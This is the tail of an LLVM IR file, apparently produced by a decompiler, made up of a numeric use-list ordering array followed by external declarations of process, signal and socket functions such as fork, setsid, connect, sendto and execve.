1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 324, 1233, 79, 225, 1234, 160, 404, 1235, 1236, 1237, 1238, 1239, 1240, 66, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 405, 1248, 1249, 1250, 1251, 226, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 227, 1261, 826, 1262, 1263, 1264, 827, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1598, 25, 1599, 1600, 1601, 853, 1602, 1603, 1604, 1605, 1606, 1607, 1274, 1273, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 161, 1485, 1486, 26, 1487, 280, 1290, 281, 1291, 1292, 162, 1293, 1624, 1640, 1641, 1642, 1643, 1047, 1774, 1775, 1776, 1777, 1627, 1778, 1628, 1779, 1780, 228, 1781, 135, 1782, 133, 134, 1783, 1784, 1785, 406, 407, 408, 1789, 409, 1800, 1805, 854, 282, 1806, 410, 1804, 411, 412, 27, 1786, 1787, 413, 229, 920, 337, 921, 416, 339, 338, 922, 923, 924, 925, 415, 926, 927, 414, 928, 1629, 230, 1788, 980, 981, 982, 983, 984, 985, 232, 163, 986, 987, 988, 136, 231, 989, 417, 910, 164, 911, 165, 912, 233, 1386, 1387, 1388, 1389, 28, 1564, 1565, 29, 913, 914, 855, 104, 915, 375, 916, 419, 1790, 420, 340, 1791, 1792, 1794, 1795, 418, 1646, 1648, 1649, 80, 283, 1650, 1647, 1644, 1645, 30, 929, 932, 930, 931, 284, 31, 1653, 1651, 1652, 285, 234, 933, 934, 935, 936, 1654, 1655, 421, 32, 1656, 235, 1657, 1658, 1659, 1660, 1661, 1662, 33, 34, 937, 938, 939, 940, 422, 35, 423, 1546, 1547, 828, 1048, 829, 1663, 1609, 1585, 973, 1586, 1548, 1549, 236, 1550, 1554, 1555, 1556, 1557, 424, 1558, 1559, 1616, 237, 238, 1608, 425, 341, 1801, 239, 36, 240, 241, 1294, 1295, 243, 1296, 426, 242, 1297, 120, 37, 1575, 1576, 1298, 1299, 286, 38, 1300, 1551, 1552, 1553, 39, 1444, 1445, 1446, 40, 1807, 1808, 121, 244, 1301, 1302, 1303, 1304, 1305, 245, 1501, 856, 1502, 150, 166, 1488, 1489, 1496, 1493, 1494, 1495, 287, 1497, 376, 1491, 1490, 288, 1492, 941, 942, 1503, 1504, 943, 944, 1306, 1307, 1308, 1309, 1310, 167, 1311, 1312, 1313, 1314, 1315, 246, 1316, 1318, 1319, 1317, 1320, 168, 1321, 1322, 247, 1323, 248, 325, 427, 1324, 1325, 249, 250, 1326, 1327, 1328, 1329, 1330, 1331, 342, 1332, 1333, 428, 1334, 343, 1336, 255, 1338, 252, 253, 1335, 251, 1337, 1339, 1341, 170, 1342, 1343, 256, 105, 106, 1344, 1345, 169, 429, 1346, 1347, 257, 430, 1348, 1349, 254, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 431, 1361, 138, 112, 1360, 1362, 1363, 1364, 41, 888, 258, 889, 149, 107, 126, 1340, 289, 917, 42, 291, 259, 919, 918, 290, 344, 1803, 1507, 1508, 1509, 108, 1510, 1511, 260, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 198, 1365, 1525, 1465, 1466, 1467, 1468, 1469, 1470, 857, 1664, 1390, 1793, 945, 1610, 1622, 946, 1630, 1796, 139, 1797, 1690, 1802, 1631, 1691, 947, 1632, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 1583, 1633, 1634, 958, 1798, 1799, 43, 1566, 171, 1567, 1568, 273, 272, 858, 140, 141, 142, 143, 860, 859, 82, 81, 172, 1569, 1570, 1571, 1572, 1574, 1573, 44, 1665, 1666, 275, 274, 861, 144, 145, 146, 147, 863, 862, 84, 83, 69, 109, 1667, 864, 45, 1668, 1669, 148, 1670, 1671, 1672, 1673, 1674, 261, 865, 868, 866, 867, 1675, 869, 332, 437, 959, 438, 292, 439, 960, 436, 67, 68, 440, 961, 962, 441, 449, 450, 478, 479, 85, 345, 432, 433, 434, 346, 435, 963, 293, 173, 443, 444, 442, 964, 965, 966, 967, 969, 311, 968, 970, 971, 447, 448, 445, 446, 972, 262, 347, 294, 975, 451, 974, 453, 454, 452, 455, 456, 976, 977, 377, 978, 457, 979, 458, 86, 127, 174, 175, 176, 177, 178, 179, 180, 348, 459, 349, 263, 990, 991, 465, 264, 992, 995, 466, 993, 467, 265, 994, 296, 996, 468, 997, 462, 998, 1001, 463, 999, 464, 1000, 295, 1002, 461, 469, 1003, 1004, 470, 1005, 1008, 471, 1006, 472, 1007, 297, 1009, 460, 473, 1010, 474, 1011, 475, 1012, 476, 1013, 1014, 1015, 477, 1016, 1017, 1018, 1019, 181, 1025, 333, 1026, 482, 1027, 87, 350, 1028, 1029, 1030, 1037, 481, 1031, 1032, 1033, 1034, 1035, 1036, 298, 1038, 483, 1039, 378, 1040, 1041, 480, 1042, 1043, 1044, 1045, 1046, 182, 183, 184, 1049, 485, 1050, 314, 88, 312, 313, 1051, 1052, 1053, 151, 379, 1054, 486, 1055, 484, 1056, 1057, 1058, 487, 1059, 317, 315, 89, 316, 1060, 1061, 488, 1062, 1063, 489, 1064, 1065, 1066, 266, 490, 1366, 1367, 90, 113, 351, 492, 493, 491, 494, 870, 871, 517, 872, 873, 874, 875, 516, 876, 877, 878, 879, 515, 880, 881, 882, 883, 512, 513, 495, 884, 514, 511, 299, 300, 885, 886, 503, 887, 504, 505, 506, 507, 508, 509, 510, 830, 1391, 91, 123, 1392, 352, 1393, 496, 497, 498, 499, 500, 501, 502, 92, 114, 122, 518, 519, 1394, 520, 1395, 353, 354, 355, 1560, 380, 1561, 1562, 1563, 124, 185, 186, 93, 94, 267, 268, 269, 270, 521, 356, 357, 358, 359, 528, 1577, 1579, 1580, 1581, 523, 1582, 524, 525, 526, 522, 301, 527, 1578, 381, 530, 531, 529, 360, 46, 533, 532, 534, 1584, 361, 362, 363, 364, 1587, 1588, 537, 535, 536, 302, 1589, 1590, 1591, 382, 318, 1595, 1596, 365, 1592, 1593, 538, 539, 540, 1594, 542, 543, 544, 545, 546, 541, 303, 547, 1597, 548, 95, 554, 96, 553, 549, 552, 305, 555, 550, 551, 304, 556, 97, 115, 1617, 1618, 383, 1619, 1620, 187, 1621, 98, 384, 1623, 306, 557, 558, 559, 560, 1625, 1626, 334, 1635, 1636, 561, 1637, 562, 1638, 1639, 563, 188, 564, 565, 566, 567, 568, 1686, 189, 99, 319, 307, 368, 369, 1676, 1677, 1678, 308, 366, 367, 370, 1679, 1680, 371, 1681, 1682, 310, 100, 190, 191, 309, 1684, 1685, 385, 192, 101, 569, 1683, 1687, 1688, 372, 1689, 890, 891, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 1809, 1810, 1811, 1812, 1813, 1814, 1815, 1816, 1817, 1818, 1819, 1820, 1821, 1822, 1823 }
  uselistorder i32* @r4, {}
}

declare i32 @vfork() local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
